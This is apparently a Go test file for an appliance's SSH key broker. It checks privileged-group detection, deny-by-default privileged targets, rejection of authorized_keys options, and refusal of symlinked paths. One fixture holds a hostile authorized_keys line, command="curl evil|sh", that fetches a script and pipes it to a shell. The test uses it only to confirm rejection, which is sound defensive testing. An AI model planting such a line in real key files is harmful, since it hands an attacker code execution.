package hostd

import (
	"os"
	"path/filepath"
	"testing"
)

const validKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRestOfKeyBase64IsFakeButLongEnoughForTest= sergey@appliance"

func writeGroupFile(t *testing.T, body string) {
	t.Helper()
	path := filepath.Join(t.TempDir(), "group")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	old := groupFilePath
	groupFilePath = path
	t.Cleanup(func() { groupFilePath = old })
}

func TestAccountPrivilegedGroup_memberList(t *testing.T) {
	writeGroupFile(t, "root:x:0:\nsudo:x:27:sergey,ops\nusers:x:100:sergey\n")
	grp, err := accountPrivilegedGroup("sergey", "1000")
	if err != nil {
		t.Fatal(err)
	}
	if grp != "sudo" {
		t.Fatalf("expected sudo, got %q", grp)
	}
}

func TestAccountPrivilegedGroup_primaryGID(t *testing.T) {
	writeGroupFile(t, "wheel:x:10:\nusers:x:100:\n")
	grp, err := accountPrivilegedGroup("svc", "10")
	if err != nil {
		t.Fatal(err)
	}
	if grp != "wheel" {
		t.Fatalf("expected wheel, got %q", grp)
	}
}

func TestAccountPrivilegedGroup_unprivileged(t *testing.T) {
	writeGroupFile(t, "sudo:x:27:sergey\nusers:x:100:kiosk\n")
	grp, err := accountPrivilegedGroup("kiosk", "100")
	if err != nil {
		t.Fatal(err)
	}
	if grp != "" {
		t.Fatalf("expected no privileged group, got %q", grp)
	}
	// Substring matches must not count: "sudoer" is not "sergey".
	if grp, _ := accountPrivilegedGroup("serge", "100"); grp != "" {
		t.Fatalf("prefix of a member name matched: %q", grp)
	}
}

// An unreadable group file must not silently downgrade to "not privileged".
func TestAccountPrivilegedGroup_failsClosed(t *testing.T) {
	old := groupFilePath
	groupFilePath = filepath.Join(t.TempDir(), "missing-group")
	t.Cleanup(func() { groupFilePath = old })
	if _, err := accountPrivilegedGroup("sergey", "1000"); err == nil {
		t.Fatal("expected an error when the group file cannot be read")
	}
}

func TestAllowPrivilegedSSHTargets(t *testing.T) {
	if allowPrivilegedSSHTargets() {
		t.Fatal("privileged targets must be denied by default")
	}
	t.Setenv("EASY_WAF_HOSTD_ALLOW_PRIVILEGED_SSH_TARGETS", "1")
	if !allowPrivilegedSSHTargets() {
		t.Fatal("explicit opt-in not honored")
	}
}

func TestReadAuthorizedKeysPayload(t *testing.T) {
	dir := t.TempDir()
	good := filepath.Join(dir, "good")
	if err := os.WriteFile(good, []byte("\n"+validKey+"\n\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	out, err := readAuthorizedKeysPayload(good)
	if err != nil {
		t.Fatalf("valid payload rejected: %v", err)
	}
	if string(out) != validKey+"\n" {
		t.Fatalf("unexpected payload: %q", out)
	}

	bad := filepath.Join(dir, "bad")
	if err := os.WriteFile(bad, []byte(`command="curl evil|sh" `+validKey+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := readAuthorizedKeysPayload(bad); err == nil {
		t.Fatal("authorized_keys options accepted by the broker")
	}
}

func TestWriteAuthorizedKeys(t *testing.T) {
	home := t.TempDir()
	content := []byte(validKey + "\n")
	if err := writeAuthorizedKeys(home, os.Getuid(), os.Getgid(), content); err != nil {
		t.Fatalf("write failed: %v", err)
	}

	akPath := filepath.Join(home, ".ssh", "authorized_keys")
	got, err := os.ReadFile(akPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != string(content) {
		t.Fatalf("content mismatch: %q", got)
	}
	fi, err := os.Stat(akPath)
	if err != nil {
		t.Fatal(err)
	}
	if fi.Mode().Perm() != 0o600 {
		t.Fatalf("authorized_keys mode = %o, want 0600", fi.Mode().Perm())
	}
	di, err := os.Stat(filepath.Join(home, ".ssh"))
	if err != nil {
		t.Fatal(err)
	}
	if di.Mode().Perm() != 0o700 {
		t.Fatalf(".ssh mode = %o, want 0700", di.Mode().Perm())
	}

	// Rewriting replaces the previous content instead of appending.
	if err := writeAuthorizedKeys(home, os.Getuid(), os.Getgid(), []byte(validKey+"\n")); err != nil {
		t.Fatalf("second write failed: %v", err)
	}
	got, err = os.ReadFile(akPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != validKey+"\n" {
		t.Fatalf("rewrite left %q", got)
	}
	// No leftover temp file next to the key file.
	if entries, err := os.ReadDir(filepath.Join(home, ".ssh")); err == nil {
		for _, e := range entries {
			if e.Name() != "authorized_keys" {
				t.Fatalf("unexpected leftover in .ssh: %s", e.Name())
			}
		}
	}
}

// A home directory that is a symlink is the classic root-chown primitive: refuse it.
func TestWriteAuthorizedKeys_refusesSymlinkedHome(t *testing.T) {
	base := t.TempDir()
	target := filepath.Join(base, "real")
	if err := os.Mkdir(target, 0o700); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(base, "home-link")
	if err := os.Symlink(target, link); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	if err := writeAuthorizedKeys(link, os.Getuid(), os.Getgid(), []byte(validKey+"\n")); err == nil {
		t.Fatal("symlinked home accepted")
	}
}

// .ssh pointing somewhere else must never receive a root-side chown/write.
func TestWriteAuthorizedKeys_refusesSymlinkedSSHDir(t *testing.T) {
	home := t.TempDir()
	target := t.TempDir()
	if err := os.Symlink(target, filepath.Join(home, ".ssh")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	if err := writeAuthorizedKeys(home, os.Getuid(), os.Getgid(), []byte(validKey+"\n")); err == nil {
		t.Fatal("symlinked .ssh accepted")
	}
	if _, err := os.Stat(filepath.Join(target, "authorized_keys")); err == nil {
		t.Fatal("wrote through the symlink into another directory")
	}
}

// authorized_keys itself may be a symlink planted by the account owner.
func TestWriteAuthorizedKeys_refusesSymlinkedKeyFile(t *testing.T) {
	home := t.TempDir()
	sshDir := filepath.Join(home, ".ssh")
	if err := os.Mkdir(sshDir, 0o700); err != nil {
		t.Fatal(err)
	}
	victim := filepath.Join(t.TempDir(), "victim")
	if err := os.WriteFile(victim, []byte("original\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(victim, filepath.Join(sshDir, "authorized_keys")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	if err := writeAuthorizedKeys(home, os.Getuid(), os.Getgid(), []byte(validKey+"\n")); err != nil {
		t.Fatalf("write failed: %v", err)
	}
	got, err := os.ReadFile(victim)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != "original\n" {
		t.Fatalf("wrote through authorized_keys symlink: %q", got)
	}
}
